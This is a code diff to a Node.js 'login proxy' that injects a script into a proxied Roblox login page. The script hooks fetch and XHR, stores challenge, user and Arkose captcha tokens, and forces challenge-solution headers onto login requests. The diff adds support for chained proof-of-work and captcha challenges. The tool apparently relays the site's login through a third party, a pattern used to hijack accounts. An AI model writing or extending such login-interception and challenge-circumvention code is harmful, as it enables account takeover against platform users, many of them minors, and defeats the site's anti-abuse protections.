@@ -6,7 +6,7 @@ const http = require('http');
 const app = express();
 
 console.log('='.repeat(60));
-console.log('🔒 PURE LOGIN PROXY - WITH ARKOSE LABS SUPPORT');
+console.log('🔒 PURE LOGIN PROXY - WITH CHAINED CHALLENGE SUPPORT');
 console.log('='.repeat(60));
 
 // Shared HTTPS agent with keep-alive for connection pooling
@@ -458,11 +458,15 @@ function buildInjectedScript(host) {
     window.__rblxBrowserTrackerId = sessionStorage.getItem('__rblxBrowserTrackerId') || null;
     window.__rblxChallengeSolved = sessionStorage.getItem('__rblxChallengeSolved') === 'true';
     window.__rblxChallengeToken = sessionStorage.getItem('__rblxChallengeToken') || null;
+    window.__rblxCaptchaToken = sessionStorage.getItem('__rblxCaptchaToken') || null;
+    window.__rblxDataExchangeBlob = sessionStorage.getItem('__rblxDataExchangeBlob') || null;
     
     if (window.__rblxChallengeId) {
         log('Restored challenge state from sessionStorage', {
             id: window.__rblxChallengeId, 
-            solved: window.__rblxChallengeSolved
+            type: window.__rblxChallengeType,
+            solved: window.__rblxChallengeSolved,
+            captchaToken: window.__rblxCaptchaToken ? 'yes' : 'no'
         });
     }
 
@@ -476,10 +480,25 @@ function buildInjectedScript(host) {
         if (window.__rblxUserId) sessionStorage.setItem('__rblxUserId', window.__rblxUserId);
         if (window.__rblxBrowserTrackerId) sessionStorage.setItem('__rblxBrowserTrackerId', window.__rblxBrowserTrackerId);
         if (window.__rblxChallengeToken) sessionStorage.setItem('__rblxChallengeToken', window.__rblxChallengeToken);
+        if (window.__rblxCaptchaToken) sessionStorage.setItem('__rblxCaptchaToken', window.__rblxCaptchaToken);
+        if (window.__rblxDataExchangeBlob) sessionStorage.setItem('__rblxDataExchangeBlob', window.__rblxDataExchangeBlob);
         sessionStorage.setItem('__rblxChallengeSolved', window.__rblxChallengeSolved ? 'true' : 'false');
     }
 
     function constructSolutionMetadata() {
+        // Check if we have a captcha token (for captcha challenges)
+        if (window.__rblxCaptchaToken && window.__rblxChallengeId) {
+            var data = {
+                unifiedCaptchaId: window.__rblxChallengeId,
+                captchaToken: window.__rblxCaptchaToken,
+                actionType: "Login"
+            };
+            var encoded = btoa(JSON.stringify(data));
+            log('Constructed CAPTCHA solution metadata', {encoded: encoded.substring(0, 50) + '...'});
+            return encoded;
+        }
+        
+        // Standard challenge metadata (for proofofwork, etc.)
         if (!window.__rblxChallengeId || !window.__rblxUserId) {
             log('Cannot construct metadata - missing challengeId or userId', {
                 challengeId: window.__rblxChallengeId, 
@@ -503,7 +522,8 @@ function buildInjectedScript(host) {
             log('Challenge state', {
                 id: window.__rblxChallengeId, 
                 type: window.__rblxChallengeType, 
-                solved: window.__rblxChallengeSolved
+                solved: window.__rblxChallengeSolved,
+                captchaToken: window.__rblxCaptchaToken ? 'yes' : 'no'
             });
         }
     }, 5000);
@@ -518,6 +538,7 @@ function buildInjectedScript(host) {
 
         // AGGRESSIVE: Always check for login endpoint and add challenge headers if available
         var isLoginRequest = url.includes('/v2/login') || url.includes('/auth-api/v2/login') || rewrittenUrl.includes('/auth-api/v2/login');
+        var isChallengeContinue = url.includes('challenge/v1/continue') || rewrittenUrl.includes('challenge/v1/continue');
         
         if (isLoginRequest) {
             log('Login request detected!', {
@@ -525,11 +546,12 @@ function buildInjectedScript(host) {
                 rewritten: rewrittenUrl,
                 solved: window.__rblxChallengeSolved,
                 hasId: !!window.__rblxChallengeId,
-                hasUserId: !!window.__rblxUserId
+                hasUserId: !!window.__rblxUserId,
+                hasCaptchaToken: !!window.__rblxCaptchaToken
             });
             
             // If we have challenge data, ALWAYS add it to login requests
-            if (window.__rblxChallengeId && window.__rblxUserId) {
+            if (window.__rblxChallengeId && (window.__rblxUserId || window.__rblxCaptchaToken)) {
                 var solutionMetadata = constructSolutionMetadata();
                 if (solutionMetadata) {
                     init.headers = init.headers || {};
@@ -543,11 +565,16 @@ function buildInjectedScript(host) {
                     init.headers['rblx-challenge-type'] = window.__rblxChallengeType || 'chef';
                     init.headers['rblx-challenge-metadata'] = solutionMetadata;
                     init.headers['x-retry-attempt'] = '1';
-                    log('ADDED challenge headers to login!', {id: window.__rblxChallengeId});
+                    log('ADDED challenge headers to login!', {id: window.__rblxChallengeId, type: window.__rblxChallengeType});
                 }
             } else {
                 log('No challenge data available for login');
             }
+        }
+        
+        // Handle challenge continue requests - check for chained challenges
+        if (isChallengeContinue) {
+            log('Challenge continue request detected', {url: url});
         }
         
         // Now create the resource with merged headers
@@ -572,10 +599,11 @@ function buildInjectedScript(host) {
             var challengeMetadata = response.headers.get('rblx-challenge-metadata');
 
             if (challengeId && challengeMetadata) {
-                log('Challenge required:', {id: challengeId, type: challengeType});
+                log('Challenge required (from headers):', {id: challengeId, type: challengeType});
                 window.__rblxChallengeId = challengeId;
                 window.__rblxChallengeType = challengeType;
                 window.__rblxChallengeSolved = false;
+                window.__rblxCaptchaToken = null; // Reset captcha token for new challenge
                 try {
                     var metaStr = atob(challengeMetadata);
                     var meta = JSON.parse(metaStr);
@@ -590,27 +618,57 @@ function buildInjectedScript(host) {
                 }
             }
 
-            // Check for challenge continue success - match both original and rewritten URLs
-            var isChallengeContinue = url.includes('challenge/v1/continue') || 
-                                      rewrittenUrl.includes('challenge/v1/continue') ||
-                                      url.includes('/challenge/v1/continue');
-            if (isChallengeContinue && response.status === 200) {
-                log('Challenge continue succeeded! Marking as solved', {url: url, rewritten: rewrittenUrl});
-                window.__rblxChallengeSolved = true;
-                saveChallengeState();
-                // Immediately persist to ensure it's available after page reload
-                sessionStorage.setItem('__rblxChallengeSolved', 'true');
-                log('Challenge state saved to sessionStorage');
-                
-                // Also store the challenge solution from the response if available
+            // Check for challenge continue response - HANDLE CHAINED CHALLENGES
+            if (isChallengeContinue) {
                 clonedResponse.text().then(function(text) {
                     try {
                         var data = JSON.parse(text);
-                        log('Challenge continue response:', data);
-                        if (data.challengeToken) {
-                            window.__rblxChallengeToken = data.challengeToken;
-                            sessionStorage.setItem('__rblxChallengeToken', data.challengeToken);
-                            log('Stored challenge token from continue response');
+                        log('Challenge continue response body:', data);
+                        
+                        // Check if response contains a NEW challenge (chained challenges)
+                        if (data.challengeType && data.challengeType !== '') {
+                            log('CHAINED CHALLENGE detected! New challenge type:', data.challengeType);
+                            window.__rblxChallengeId = data.challengeId;
+                            window.__rblxChallengeType = data.challengeType;
+                            window.__rblxChallengeSolved = false;
+                            window.__rblxCaptchaToken = null;
+                            
+                            // Parse the new challenge metadata
+                            if (data.challengeMetadata) {
+                                try {
+                                    var meta = JSON.parse(data.challengeMetadata);
+                                    log('New challenge metadata:', meta);
+                                    
+                                    // Handle captcha challenge specifically
+                                    if (data.challengeType === 'captcha') {
+                                        window.__rblxDataExchangeBlob = meta.dataExchangeBlob;
+                                        log('CAPTCHA challenge with dataExchangeBlob stored');
+                                        
+                                        // Trigger captcha render if Arkose is available
+                                        if (window.arkose && window.arkose.render) {
+                                            log('Triggering Arkose captcha render...');
+                                            window.arkose.render(meta.dataExchangeBlob);
+                                        } else {
+                                            log('Arkose not ready yet, blob stored for later');
+                                        }
+                                    }
+                                } catch(e) {
+                                    log('Failed to parse chained challenge metadata:', e.message);
+                                }
+                            }
+                            saveChallengeState();
+                        } else if (response.status === 200) {
+                            // No new challenge type, this challenge is complete
+                            log('Challenge continue succeeded! Marking as solved', {url: url});
+                            window.__rblxChallengeSolved = true;
+                            saveChallengeState();
+                            sessionStorage.setItem('__rblxChallengeSolved', 'true');
+                            
+                            if (data.challengeToken) {
+                                window.__rblxChallengeToken = data.challengeToken;
+                                sessionStorage.setItem('__rblxChallengeToken', data.challengeToken);
+                                log('Stored challenge token from continue response');
+                            }
                         }
                     } catch(e) {
                         log('Failed to parse challenge continue response:', e.message);
@@ -645,14 +703,15 @@ function buildInjectedScript(host) {
         
         // AGGRESSIVE: Check for login endpoint
         var isLoginUrl = this.__rblxUrl && (this.__rblxUrl.includes('/v2/login') || this.__rblxUrl.includes('/auth-api/v2/login'));
+        var isChallengeContinue = this.__rblxUrl && this.__rblxUrl.includes('challenge/v1/continue');
         
         // Debug: Log all XHR requests to login/challenge endpoints
-        if (isLoginUrl || (this.__rblxUrl && this.__rblxUrl.includes('challenge'))) {
+        if (isLoginUrl || isChallengeContinue) {
             log('XHR send:', {url: this.__rblxUrl, solved: window.__rblxChallengeSolved, id: window.__rblxChallengeId, hasUserId: !!window.__rblxUserId});
         }
 
         // AGGRESSIVE: If we have challenge data, ALWAYS add it to login requests
-        if (isLoginUrl && window.__rblxChallengeId && window.__rblxUserId) {
+        if (isLoginUrl && window.__rblxChallengeId && (window.__rblxUserId || window.__rblxCaptchaToken)) {
             var solutionMetadata = constructSolutionMetadata();
             if (solutionMetadata) {
                 var hasChallengeHeader = this.__rblxHeaders && this.__rblxHeaders['rblx-challenge-metadata'];
@@ -679,14 +738,48 @@ function buildInjectedScript(host) {
                     log('XHR response:', {url: self.__rblxUrl, status: self.status});
                 }
                 
+                // Handle challenge continue response for XHR
+                if (isChallengeContinue) {
+                    try {
+                        var text = self.responseText;
+                        var data = JSON.parse(text);
+                        log('XHR Challenge continue response:', data);
+                        
+                        // Check for chained challenge
+                        if (data.challengeType && data.challengeType !== '') {
+                            log('XHR CHAINED CHALLENGE detected! Type:', data.challengeType);
+                            window.__rblxChallengeId = data.challengeId;
+                            window.__rblxChallengeType = data.challengeType;
+                            window.__rblxChallengeSolved = false;
+                            window.__rblxCaptchaToken = null;
+                            
+                            if (data.challengeMetadata) {
+                                var meta = JSON.parse(data.challengeMetadata);
+                                if (data.challengeType === 'captcha' && meta.dataExchangeBlob) {
+                                    window.__rblxDataExchangeBlob = meta.dataExchangeBlob;
+                                    log('XHR: CAPTCHA blob stored');
+                                }
+                            }
+                            saveChallengeState();
+                        } else if (self.status === 200) {
+                            log('XHR Challenge continue succeeded, marking as solved');
+                            window.__rblxChallengeSolved = true;
+                            saveChallengeState();
+                        }
+                    } catch(e) {
+                        // Ignore parse errors
+                    }
+                }
+                
                 var challengeId = self.getResponseHeader('rblx-challenge-id');
                 var challengeType = self.getResponseHeader('rblx-challenge-type');
                 var challengeMetadata = self.getResponseHeader('rblx-challenge-metadata');
                 if (challengeId && challengeMetadata) {
-                    log('XHR Challenge required:', {id: challengeId, type: challengeType});
+                    log('XHR Challenge required (from headers):', {id: challengeId, type: challengeType});
                     window.__rblxChallengeId = challengeId;
                     window.__rblxChallengeType = challengeType;
                     window.__rblxChallengeSolved = false;
+                    window.__rblxCaptchaToken = null;
                     try {
                         var metaStr = atob(challengeMetadata);
                         var meta = JSON.parse(metaStr);
@@ -696,11 +789,6 @@ function buildInjectedScript(host) {
                     } catch(e) {
                         log('XHR Failed to parse metadata:', e.message);
                     }
-                    saveChallengeState();
-                }
-                if (self.__rblxUrl && self.__rblxUrl.includes('challenge/v1/continue') && self.status === 200) {
-                    log('XHR Challenge continue succeeded, marking as solved');
-                    window.__rblxChallengeSolved = true;
                     saveChallengeState();
                 }
             }
@@ -743,6 +831,17 @@ function buildInjectedScript(host) {
         return element;
     };
     
+    // Helper to set captcha token (called by Arkose callback)
+    window.setRblxCaptchaToken = function(token) {
+        log('Captcha token received from Arkose!', {token: token.substring(0, 30) + '...'});
+        window.__rblxCaptchaToken = token;
+        window.__rblxChallengeSolved = true;
+        saveChallengeState();
+        
+        // Trigger a new challenge/continue request with the captcha token
+        log('Ready to submit captcha solution');
+    };
+    
     // Helper to clear challenge state after successful login
     window.clearRblxChallengeState = function() {
         window.__rblxChallengeId = null;
@@ -751,12 +850,16 @@ function buildInjectedScript(host) {
         window.__rblxBrowserTrackerId = null;
         window.__rblxChallengeSolved = false;
         window.__rblxChallengeToken = null;
+        window.__rblxCaptchaToken = null;
+        window.__rblxDataExchangeBlob = null;
         sessionStorage.removeItem('__rblxChallengeId');
         sessionStorage.removeItem('__rblxChallengeType');
         sessionStorage.removeItem('__rblxUserId');
         sessionStorage.removeItem('__rblxBrowserTrackerId');
         sessionStorage.removeItem('__rblxChallengeSolved');
         sessionStorage.removeItem('__rblxChallengeToken');
+        sessionStorage.removeItem('__rblxCaptchaToken');
+        sessionStorage.removeItem('__rblxDataExchangeBlob');
         log('Challenge state cleared');
     };
     
@@ -768,7 +871,9 @@ function buildInjectedScript(host) {
             userId: window.__rblxUserId,
             browserTrackerId: window.__rblxBrowserTrackerId,
             challengeSolved: window.__rblxChallengeSolved,
-            challengeToken: window.__rblxChallengeToken
+            challengeToken: window.__rblxChallengeToken,
+            captchaToken: window.__rblxCaptchaToken ? 'yes' : 'no',
+            dataExchangeBlob: window.__rblxDataExchangeBlob ? 'yes' : 'no'
         };
     };
 
@@ -791,7 +896,8 @@ function buildInjectedScript(host) {
                     log('Login button clicked!', {
                         solved: window.__rblxChallengeSolved, 
                         id: window.__rblxChallengeId,
-                        userId: window.__rblxUserId
+                        userId: window.__rblxUserId,
+                        captchaToken: window.__rblxCaptchaToken ? 'yes' : 'no'
                     });
                 }
             }
@@ -807,7 +913,8 @@ function buildInjectedScript(host) {
             log('Login form submitted!', {
                 action: action,
                 solved: window.__rblxChallengeSolved,
-                id: window.__rblxChallengeId
+                id: window.__rblxChallengeId,
+                captchaToken: window.__rblxCaptchaToken ? 'yes' : 'no'
             });
         }
     }, true);
@@ -844,7 +951,7 @@ function buildInjectedScript(host) {
         });
     }
 
-    log('Proxy interceptor loaded with Arkose Labs support');
+    log('Proxy interceptor loaded with CHAINED CHALLENGE support');
     log('Challenge state:', window.getRblxChallengeState());
 })();
 </script>`;
